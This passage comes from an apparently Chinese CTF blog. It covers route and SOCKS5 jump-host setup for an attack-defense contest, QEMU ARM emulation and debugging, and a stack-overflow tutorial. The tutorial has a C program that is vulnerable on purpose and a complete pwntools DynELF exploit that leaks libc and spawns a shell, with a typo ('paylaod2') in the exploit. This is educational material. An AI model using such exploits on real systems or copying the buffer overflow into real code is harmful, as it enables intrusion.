class="number">224.0</span>.<span class="number">0.0</span>        <span class="number">240.0</span>.<span class="number">0.0</span>            在链路上     <span class="number">192.168</span>.<span class="number">201.2</span>    <span class="number">281</span></span><br><span class="line">        <span class="number">224.0</span>.<span class="number">0.0</span>        <span class="number">240.0</span>.<span class="number">0.0</span>            在链路上     <span class="number">172.17</span>.<span class="number">126.97</span>    <span class="number">271</span></span><br><span class="line">        <span class="number">224.0</span>.<span class="number">0.0</span>        <span class="number">240.0</span>.<span class="number">0.0</span>            在链路上         <span class="number">10.0</span>.<span class="number">10.2</span>    <span class="number">281</span></span><br><span class="line">        <span class="number">224.0</span>.<span class="number">0.0</span>        <span class="number">240.0</span>.<span class="number">0.0</span>            在链路上     <span class="number">192.168</span>.<span class="number">43.65</span>    <span class="number">291</span></span><br><span class="line">        <span class="number">224.0</span>.<span class="number">0.0</span>        <span class="number">240.0</span>.<span class="number">0.0</span>            在链路上      <span class="number">192.168</span>.<span class="number">61.1</span>    <span class="number">291</span></span><br><span class="line">        <span class="number">224.0</span>.<span class="number">0.0</span>        <span class="number">240.0</span>.<span class="number">0.0</span>            在链路上     <span class="number">192.168</span>.<span class="number">159.1</span>    <span class="number">291</span></span><br><span class="line">  <span class="number">255.255</span>.<span class="number">255.255</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上         <span class="number">127.0</span>.<span class="number">0.1</span>    <span class="number">331</span></span><br><span class="line">  <span class="number">255.255</span>.<span class="number">255.255</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上      <span class="number">192.168</span>.<span class="number">56.1</span>    <span class="number">281</span></span><br><span class="line">  <span class="number">255.255</span>.<span class="number">255.255</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上     <span class="number">192.168</span>.<span class="number">201.2</span>    <span class="number">281</span></span><br><span class="line">  <span class="number">255.255</span>.<span class="number">255.255</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上     <span class="number">172.17</span>.<span class="number">126.97</span>    <span class="number">271</span></span><br><span class="line">  <span class="number">255.255</span>.<span class="number">255.255</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上         <span class="number">10.0</span>.<span class="number">10.2</span>    <span class="number">281</span></span><br><span class="line">  <span class="number">255.255</span>.<span class="number">255.255</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上     <span class="number">192.168</span>.<span class="number">43.65</span>    <span class="number">291</span></span><br><span class="line">  <span class="number">255.255</span>.<span class="number">255.255</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上      <span class="number">192.168</span>.<span class="number">61.1</span>    <span class="number">291</span></span><br><span class="line">  <span class="number">255.255</span>.<span class="number">255.255</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上     <span class="number">192.168</span>.<span class="number">159.1</span>    <span class="number">291</span></span><br><span class="line">===========================================================================</span><br><span class="line">永久路由:</span><br><span class="line">  无</span><br><span class="line"></span><br><span class="line">IPv6 路由表</span><br><span class="line">===========================================================================</span><br><span class="line">活动路由:</span><br><span class="line"> 接口跃点数网络目标                网关</span><br><span class="line"> <span class="number">16</span>     <span class="number">51</span> ::/<span class="number">0</span>                     fe80::<span class="number">90</span>f0:<span class="number">52</span>ff:fe0e:<span class="number">4</span>b86</span><br><span class="line">  <span class="number">1</span>    <span class="number">331</span> ::<span class="number">1</span>/<span class="number">128</span>                  在链路上</span><br><span class="line"> <span class="number">19</span>    <span class="number">331</span> <span class="number">2001</span>::/<span class="number">32</span>                在链路上</span><br><span class="line"> <span class="number">19</span>    <span class="number">331</span> <span class="number">2001</span>:<span class="number">0</span>:<span class="number">284</span>a:<span class="number">364</span>:<span class="number">181</span>c:cd3e:<span class="number">2097</span>:c0dd/<span class="number">128</span></span><br><span class="line">                                    在链路上</span><br><span class="line"> <span class="number">16</span>     <span class="number">51</span> <span class="number">2409</span>:<span class="number">8955</span>:<span class="number">3014</span>:<span class="number">2</span>e39::/<span class="number">64</span> 在链路上</span><br><span class="line"> <span class="number">16</span>    <span class="number">291</span> <span class="number">2409</span>:<span class="number">8955</span>:<span class="number">3014</span>:<span class="number">2</span>e39:<span class="number">4438</span>:<span class="number">1682</span>:<span class="number">19</span>e2:<span class="number">8070</span>/<span class="number">128</span></span><br><span class="line">                                    在链路上</span><br><span class="line"> <span class="number">16</span>    <span class="number">291</span> <span class="number">2409</span>:<span class="number">8955</span>:<span class="number">3014</span>:<span class="number">2</span>e39:<span class="number">6513</span>:<span class="number">5</span>ca8:<span class="number">8</span>df0:e7f/<span class="number">128</span></span><br><span class="line">                                    在链路上</span><br><span class="line">  <span class="number">4</span>    <span class="number">281</span> fe80::/<span class="number">64</span>                在链路上</span><br><span class="line"> <span class="number">17</span>    <span class="number">281</span> fe80::/<span class="number">64</span>                在链路上</span><br><span class="line">  <span class="number">9</span>    <span class="number">271</span> fe80::/<span class="number">64</span>                在链路上</span><br><span class="line"> <span class="number">20</span>    <span class="number">281</span> fe80::/<span class="number">64</span>                在链路上</span><br><span class="line"> <span class="number">16</span>    <span class="number">291</span> fe80::/<span class="number">64</span>                在链路上</span><br><span class="line">  <span class="number">7</span>    <span class="number">291</span> fe80::/<span class="number">64</span>                在链路上</span><br><span class="line"> <span class="number">10</span>    <span class="number">291</span> fe80::/<span class="number">64</span>                在链路上</span><br><span class="line"> <span class="number">19</span>    <span class="number">331</span> fe80::/<span class="number">64</span>                在链路上</span><br><span class="line">  <span class="number">9</span>    <span class="number">271</span> fe80::<span class="number">861</span>:<span class="number">2</span>a51:<span class="number">6</span>e5a:<span class="number">761</span>b/<span class="number">128</span></span><br><span class="line">                                    在链路上</span><br><span class="line"> <span class="number">19</span>    <span class="number">331</span> fe80::<span class="number">181</span>c:cd3e:<span class="number">2097</span>:c0dd/<span class="number">128</span></span><br><span class="line">                                    在链路上</span><br><span class="line">  <span class="number">4</span>    <span class="number">281</span> fe80::<span class="number">40</span>de:<span class="number">409</span>b:e37f:<span class="number">34</span>eb/<span class="number">128</span></span><br><span class="line">                                    在链路上</span><br><span class="line"> <span class="number">16</span>    <span class="number">291</span> fe80::<span class="number">4438</span>:<span class="number">1682</span>:<span class="number">19</span>e2:<span class="number">8070</span>/<span class="number">128</span></span><br><span class="line">                                    在链路上</span><br><span class="line"> <span class="number">20</span>    <span class="number">281</span> fe80::<span class="number">716</span>b:<span class="number">1</span>e8e:e67a:bdf/<span class="number">128</span></span><br><span class="line">                                    在链路上</span><br><span class="line"> <span class="number">10</span>    <span class="number">291</span> fe80::<span class="number">907</span>b:<span class="number">8932</span>:<span class="number">6</span>a09:c20b/<span class="number">128</span></span><br><span class="line">                                    在链路上</span><br><span class="line">  <span class="number">7</span>    <span class="number">291</span> fe80::<span class="number">9401</span>:d238:<span class="number">7</span>f61:d7d3/<span class="number">128</span></span><br><span class="line">                                    在链路上</span><br><span class="line"> <span class="number">17</span>    <span class="number">281</span> fe80::cd1f:a63d:<span class="number">6</span>cee:c094/<span class="number">128</span></span><br><span class="line">                                    在链路上</span><br><span class="line">  <span class="number">1</span>    <span class="number">331</span> ff00::/<span class="number">8</span>                 在链路上</span><br><span class="line">  <span class="number">4</span>    <span class="number">281</span> ff00::/<span class="number">8</span>                 在链路上</span><br><span class="line"> <span class="number">17</span>    <span class="number">281</span> ff00::/<span class="number">8</span>                 在链路上</span><br><span class="line">  <span class="number">9</span>    <span class="number">271</span> ff00::/<span class="number">8</span>                 在链路上</span><br><span class="line"> <span class="number">20</span>    <span class="number">281</span> ff00::/<span class="number">8</span>                 在链路上</span><br><span class="line"> <span class="number">16</span>    <span class="number">291</span> ff00::/<span class="number">8</span>                 在链路上</span><br><span class="line">  <span class="number">7</span>    <span class="number">291</span> ff00::/<span class="number">8</span>                 在链路上</span><br><span class="line"> <span class="number">10</span>    <span class="number">291</span> ff00::/<span class="number">8</span>                 在链路上</span><br><span class="line"> <span class="number">19</span>    <span class="number">331</span> ff00::/<span class="number">8</span>                 在链路上</span><br><span class="line">===========================================================================</span><br><span class="line">永久路由:</span><br><span class="line">  无</span><br></pre></td></tr></table></figure>

<p>关键是看本机有线网卡和无线网卡的网络通信接口号，例如</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">接口列表</span><br><span class="line">  <span class="number">9</span>...<span class="number">00</span> <span class="number">15</span> <span class="number">5</span>d bf b4 b8 ......Hyper-V Virtual Ethernet Adapter</span><br><span class="line"> <span class="number">20</span>...<span class="number">80</span> e8 <span class="number">2</span>c <span class="number">1</span>a <span class="number">31</span> <span class="number">4</span>d ......Realtek PCIe GbE Family Controller</span><br><span class="line"> <span class="number">21</span>...<span class="number">08</span> <span class="number">00</span> <span class="number">58</span> <span class="number">00</span> <span class="number">00</span> <span class="number">05</span> ......SSL VPN Client Virtual Network Adapter</span><br><span class="line">  <span class="number">4</span>...<span class="number">0</span>a <span class="number">00</span> <span class="number">27</span> <span class="number">00</span> <span class="number">00</span> <span class="number">04</span> ......VirtualBox Host-Only Ethernet Adapter</span><br><span class="line"> <span class="number">17</span>...<span class="number">0</span>a <span class="number">00</span> <span class="number">27</span> <span class="number">00</span> <span class="number">00</span> <span class="number">11</span> ......VirtualBox Host-Only Ethernet Adapter <span class="comment">#2</span></span><br><span class="line"> <span class="number">25</span>...f2 <span class="number">68</span> e6 <span class="number">73</span> <span class="number">9</span>b <span class="number">9</span>f ......Microsoft Wi-Fi Direct Virtual Adapter</span><br><span class="line"> <span class="number">15</span>...b2 <span class="number">68</span> e6 <span class="number">73</span> <span class="number">9</span>b <span class="number">9</span>f ......Microsoft Wi-Fi Direct Virtual Adapter <span class="comment">#3</span></span><br><span class="line">  <span class="number">7</span>...<span class="number">00</span> <span class="number">50</span> <span class="number">56</span> c0 <span class="number">00</span> <span class="number">01</span> ......VMware Virtual Ethernet Adapter <span class="keyword">for</span> VMnet1</span><br><span class="line"> <span class="number">10</span>...<span class="number">00</span> <span class="number">50</span> <span class="number">56</span> c0 <span class="number">00</span> <span class="number">08</span> ......VMware Virtual Ethernet Adapter <span class="keyword">for</span> VMnet8</span><br><span class="line"> <span class="number">16</span>...b0 <span class="number">68</span> e6 <span class="number">73</span> <span class="number">9</span>b <span class="number">9</span>f ......Realtek RTL8822BE <span class="number">802.11</span>ac PCIe Adapter</span><br><span class="line"> <span class="number">11</span>...b0 <span class="number">68</span> e6 <span class="number">73</span> <span class="number">9</span>b a0 ......Bluetooth Device (Personal Area Network)</span><br><span class="line">  <span class="number">1</span>...........................Software Loopback Interface <span class="number">1</span></span><br><span class="line"> <span class="number">19</span>...<span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> e0 Microsoft Teredo Tunneling Adapter</span><br></pre></td></tr></table></figure>

<p>我们一般都是有线网卡用的是比赛平台的内网环境，无线网卡就是外网环境，所以这个例子中</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">20</span>...<span class="number">80</span> e8 <span class="number">2</span>c <span class="number">1</span>a <span class="number">31</span> <span class="number">4</span>d ......Realtek PCIe GbE Family Controller</span><br><span class="line"><span class="number">16</span>...b0 <span class="number">68</span> e6 <span class="number">73</span> <span class="number">9</span>b <span class="number">9</span>f ......Realtek RTL8822BE <span class="number">802.11</span>ac PCIe Adapter</span><br></pre></td></tr></table></figure>

<p>有线网卡的接口号是：20，无线网卡的接口号是：16</p>
<p>然后就是清除原来的路由表</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route delete <span class="number">0.0</span>.<span class="number">0.0</span></span><br></pre></td></tr></table></figure>

<p>然后默认网络走无线网络的接口</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route add <span class="number">0.0</span>.<span class="number">0.0</span> mask <span class="number">0.0</span>.<span class="number">0.0</span> <span class="number">192.168</span>.<span class="number">43.1</span> metric <span class="number">1</span> <span class="keyword">if</span> <span class="number">16</span></span><br></pre></td></tr></table></figure>

<p>然后配置比赛内网的网段走有线端口</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route add <span class="number">10.0</span>.<span class="number">10.0</span> mask <span class="number">255.255</span>.<span class="number">255.0</span> <span class="number">10.0</span>.<span class="number">10.254</span> metric <span class="number">3</span> <span class="keyword">if</span> <span class="number">20</span></span><br><span class="line">route add <span class="number">192.168</span>.<span class="number">100.0</span> mask <span class="number">255.255</span>.<span class="number">255.0</span> <span class="number">10.0</span>.<span class="number">10.254</span> metric <span class="number">3</span> <span class="keyword">if</span> <span class="number">20</span></span><br></pre></td></tr></table></figure>

<h2 id="跳板机and攻击机"><a href="#跳板机and攻击机" class="headerlink" title="跳板机and攻击机"></a>跳板机and攻击机</h2><p>可以先用Xshell连接上跳板机然后在跳板机中开启socks5代理</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SSH -&gt; 隧道 -&gt; 添加 -&gt; 类型（方向）-&gt; Dymaic（Socks4/5）</span><br></pre></td></tr></table></figure>

<p>记住跳板机的本地监听端口，然后用Proxifer新建一个代理服务器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Profile -&gt; Add -&gt; address: 127.0.0.1 port:刚刚记录的 Type:Socks5</span><br></pre></td></tr></table></figure>

<p>然后自定义网络代理流量规则</p>
<p><strong>Proxification Rules</strong> 将攻击机的地址填入 <strong>Target Hosts</strong> 然后 <strong>Action</strong> 选择我们刚刚创建的跳板机</p>
<p>这样就完成了基础的网络配置</p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/30/ARM╙δQEMU-Tips-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/12/30/ARM╙δQEMU-Tips-1/" class="post-title-link" itemprop="url">ARM与QEMU-Tips-1</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2019-12-30 18:44:09" itemprop="dateCreated datePublished" datetime="2019-12-30T18:44:09-08:00">2019-12-30</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Bearbeitet am</span>
                <time title="Geändert am: 2019-12-31 10:44:36" itemprop="dateModified" datetime="2019-12-31T10:44:36-08:00">2019-12-31</time>
              </span>
            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="QEMU的安装"><a href="#QEMU的安装" class="headerlink" title="QEMU的安装"></a>QEMU的安装</h2><h3 id="0x01-安装必要环境"><a href="#0x01-安装必要环境" class="headerlink" title="0x01 安装必要环境"></a>0x01 安装必要环境</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install -y qemu-user gcc-arm-linux-gnueabi binutils-arm-linux-gnueabigcc-arm-linux-gnueabi lib32ncurses5 lib32z1</span><br></pre></td></tr></table></figure>

<h3 id="0x02-安装Qemu"><a href="#0x02-安装Qemu" class="headerlink" title="0x02 安装Qemu"></a>0x02 安装Qemu</h3><p>有两种方法可以在Linux环境下安装Qemu工具，第一种直接使用XUbuntu系统的apt工具安装，但是这种方法安装的Qemu系统版本不是最新的，如果需要安装最新版本的Qemu工具，就需要通过Git工具下载源码，切换到最新分支再去编译安装了。具体操作如下所述</p>
<h4 id="快速安装Qemu："><a href="#快速安装Qemu：" class="headerlink" title="快速安装Qemu："></a>快速安装Qemu：</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install qemu</span><br></pre></td></tr></table></figure>

<h4 id="下载Qemu源码编译安装"><a href="#下载Qemu源码编译安装" class="headerlink" title="下载Qemu源码编译安装"></a>下载Qemu源码编译安装</h4><p>从Git服务器下载Qemu代码，记着在下载之前选择并切换需要的源码分支：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone git://git.qemu-project.org/qemu.git</span><br></pre></td></tr></table></figure>

<p>编译并安装Qemu：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure --target-list=arm-softmmu --audio-drv-list=</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<h4 id="查看Qemu版本"><a href="#查看Qemu版本" class="headerlink" title="查看Qemu版本"></a>查看Qemu版本</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-arm --version</span><br></pre></td></tr></table></figure>

<h4 id="查看Qemu支持的开发板"><a href="#查看Qemu支持的开发板" class="headerlink" title="查看Qemu支持的开发板"></a>查看Qemu支持的开发板</h4><p>Qemu工具支持大量开发板的虚拟，现存的大部分常用开发板都能很好地支持。通过下面的命令操作可以看到当前版本的Qemu工具支持的开发板列表：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-arm -M help</span><br></pre></td></tr></table></figure>

<h1 id="模拟ARM程序"><a href="#模拟ARM程序" class="headerlink" title="模拟ARM程序"></a>模拟ARM程序</h1><p>需要设置<strong>ld-linux.so</strong>的加载路径</p>
<p>以下两种方式都可以：</p>
<ul>
<li><code>qemu-arm -L /usr/arm-linux-gnueabi -cpu cortex-a15 awd7</code></li>
<li><code>export QEMU_LD_PREFIX=/usr/arm-linux-gnueabi qemu-arm -cpu cortex-a15 awd7</code></li>
</ul>
<p>如果不这样设置的话，一般会出现这样的错误，提示不能加载<code>ld-linux</code>:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/lib/ld-linux.so.3: No such file or directory</span><br></pre></td></tr></table></figure>

<p>当然，如果不这样设置的话，可以将程序编译成静态链接的，命令如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arm-linux-gnueabi-gcc -o simple -c simple -static</span><br></pre></td></tr></table></figure>

<h2 id="ARM程序调试"><a href="#ARM程序调试" class="headerlink" title="ARM程序调试"></a>ARM程序调试</h2><p>进行远程调试关键是增加 -g 参数，指定端口</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -g 1235 -L /usr/arm-linux-gnueabi -cpu cortex-a15 awd7</span><br></pre></td></tr></table></figure>

<p> 然后使用GDB进行远程调试</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) target remote :1235</span><br><span class="line">Remote debugging using :1235</span><br></pre></td></tr></table></figure>


        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/23/╟│╠╕╒╗╥τ│÷╠ε│Σ▓╝╛╓-2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/12/23/╟│╠╕╒╗╥τ│÷╠ε│Σ▓╝╛╓-2/" class="post-title-link" itemprop="url">浅谈栈溢出填充布局-2</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2019-12-23 19:29:50" itemprop="dateCreated datePublished" datetime="2019-12-23T19:29:50-08:00">2019-12-23</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Bearbeitet am</span>
                <time title="Geändert am: 2019-12-24 11:30:08" itemprop="dateModified" datetime="2019-12-24T11:30:08-08:00">2019-12-24</time>
              </span>
            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="DynELF"><a href="#DynELF" class="headerlink" title="DynELF"></a>DynELF</h2><p>当我们未知一个程序的<strong>libc</strong>版本时，可能就没法使用<strong>ret2libc</strong>或者<strong>ret2plt</strong>，这时我们可以考虑使用<strong>DynELF</strong>来获取我们所需要的地址，<strong>pwntools</strong>中已经自带了强大的工具</p>
<p>首先举一个带有漏洞的例子程序</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vul_func</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO,buf,<span class="number">256</span>);<span class="comment">//STDIN_FILENO = 0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">    vul_func();</span><br><span class="line">    write(STDOUT_FLENO,<span class="string">"Hello,World\n"</span>,<span class="number">13</span>);</span><br><span class="line">    <span class="comment">//STDOUT_FLENO = 1,13 = 13 char</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实这里可以说一下在<strong>UNIX</strong>一些系统调用中使用到<strong>STDIN_FILENO</strong>表示标准输入,<strong>STDOUT_FILENO</strong>表示标准输出，<strong>STDERR_FILENO</strong>表示标准出错，使用时需要加头文件<strong>&lt;unistd.h&gt;</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Standard file descriptors. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STDIN_FILENO 0 <span class="comment">/* Standard input. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STDOUT_FILENO 1 <span class="comment">/* Standard output. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STDERR_FILENO 2 <span class="comment">/* Standard error output. */</span></span></span><br></pre></td></tr></table></figure>

<p>首先看一下完整的<strong>EXP</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./rop_sample"</span>)</span><br><span class="line">plt_write = elf.symbols[<span class="string">"write"</span>]</span><br><span class="line">plt_read = elf.symbols[<span class="string">"read"</span>]</span><br><span class="line">vulfunc_addr = <span class="number">0x0804844b</span> <span class="comment"># no PIE</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    payload1 = <span class="string">"A"</span>*<span class="number">132</span> + p32(plt_write) + p32(vulfunc_addr) + p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">    p.send(payload1)</span><br><span class="line">    data = p.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"%#x =&gt; %s"</span> %(address,(data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./rop_sample"</span>)</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">'./rop_sample'</span>))</span><br><span class="line"></span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr="</span> + hex(system_addr)</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x0804a024</span></span><br><span class="line">pppr = <span class="number">0x0804850d</span> <span class="comment"># no PIE</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"A"</span>*<span class="number">132</span> + p32(plt_read) + p32(pppr) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">0</span>)</span><br><span class="line">paylaod2 += p32(system_addr) + p32(vulfunc_addr) + p32(bss_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n###sending payload2 ...###"</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.send(<span class="string">"/bin/sh"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>首先来分析一下leak函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    payload1 = <span class="string">"A"</span>*<span class="number">132</span> + p32(plt_write) + p32(vulfunc_addr) + p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">    p.send(payload1)</span><br><span class="line">    data = p.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"%#x =&gt; %s"</span> %(address,(data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure>

<p>使用<strong>DynELF</strong>的关键是找到一个<strong>vulfunc</strong>函数去构建<strong>leak</strong>函数，其中vulfunc函数的特征是具有可无限次读写内存地址的能力，比如例子中的<strong>vul_func</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vul_func</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO,buf,<span class="number">256</span>);<span class="comment">//STDIN_FILENO = 0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

